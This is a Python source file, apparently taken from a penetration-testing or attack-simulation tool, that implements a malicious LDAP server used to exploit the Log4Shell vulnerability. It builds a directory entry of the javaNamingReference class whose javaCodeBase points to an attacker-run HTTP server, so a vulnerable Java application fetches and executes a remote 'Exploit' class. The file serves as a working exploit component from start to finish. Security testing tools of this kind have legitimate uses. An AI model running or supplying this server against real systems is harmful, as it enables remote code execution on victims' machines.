import logging
import multiprocessing
import tempfile
from pathlib import Path

from ldaptor.interfaces import IConnectedLDAPEntry
from ldaptor.ldiftree import LDIFTreeEntry
from ldaptor.protocols.ldap.ldapserver import LDAPServer
from twisted.application import service
from twisted.internet import reactor
from twisted.internet.protocol import ServerFactory
from twisted.python import log
from twisted.python.components import registerAdapter

logger = logging.getLogger(__name__)

EXPLOIT_RDN = "dn=Exploit"


class Tree:
    """
    An LDAP directory information tree (DIT) used to exploit log4shell
    Adapted from: https://ldaptor.readthedocs.io/en/latest/cookbook/servers.html
    """

    def __init__(self, http_server_ip: str, http_server_port: int, storage_dir: Path):
        self.path = tempfile.mkdtemp(prefix="log4shell", suffix=".ldap", dir=storage_dir)
        self.db = LDIFTreeEntry(self.path)

        self._init_db(http_server_ip, http_server_port)

    def _init_db(self, http_server_ip: str, http_server_port: int):
        attributes = {
            "javaFactory": ["Exploit"],
            "objectClass": ["javaNamingReference"],
            "javaCodeBase": [f"http://{http_server_ip}:{http_server_port}/"],
            "javaClassName": ["Exploit"],
        }

        self.db.addChild(EXPLOIT_RDN, attributes)


class LDAPServerFactory(ServerFactory):
    """
    Our Factory is meant to persistently store the ldap tree
    Adapted from: https://ldaptor.readthedocs.io/en/latest/cookbook/servers.html
    """

    protocol = LDAPServer

    def __init__(self, root):
        self.root = root

    def buildProtocol(self, addr):
        proto = self.protocol()
        proto.debug = self.debug
        proto.factory = self
        return proto


class LDAPExploitServer:
    """
    This class wraps the creation of an Ldaptor LDAP server that is used to exploit log4shell.
    Adapted from: https://ldaptor.readthedocs.io/en/latest/cookbook/servers.html
    """

    def __init__(
        self, ldap_server_port: int, http_server_ip: str, http_server_port: int, storage_dir: Path
    ):
        self._ldap_server_port = ldap_server_port
        self._http_server_ip = http_server_ip
        self._http_server_port = http_server_port
        self._storage_dir = storage_dir

        # A Twisted reactor can only be started and stopped once. It cannot be restarted after it
        # has been stopped. To work around this, the reactor is configured and run in a separate
        # process. This allows us to run multiple LDAP servers sequentially or simultaneously and
        # stop each one when we're done with it.
        self._server_process = multiprocessing.Process(
            target=self._run_twisted_reactor, daemon=True
        )

    def run(self):
        self._server_process.start()
        self._server_process.join()

    def _run_twisted_reactor(self):
        self._configure_twisted_reactor()
        logger.debug(f"Starting log4shell LDAP server on port {self._ldap_server_port}")
        reactor.run()

    def _configure_twisted_reactor(self):
        LDAPExploitServer._output_twisted_logs_to_python_logger()

        registerAdapter(lambda x: x.root, LDAPServerFactory, IConnectedLDAPEntry)

        tree = Tree(self._http_server_ip, self._http_server_port, self._storage_dir)
        factory = LDAPServerFactory(tree.db)
        factory.debug = True

        application = service.Application("ldaptor-server")
        service.IServiceCollection(application)
        reactor.listenTCP(self._ldap_server_port, factory)

    @staticmethod
    def _output_twisted_logs_to_python_logger():
        # Configures Twisted to output its logs using the standard python logging module instead of
        # the Twisted logging module.
        # https://twistedmatrix.com/documents/current/api/twisted.python.log.PythonLoggingObserver.html
        log_observer = log.PythonLoggingObserver()
        log_observer.start()

    def stop(self):
        # The Twisted reactor registers signal handlers so it can catch SIGTERM and gracefully
        # shutdown.
        self._server_process.terminate()
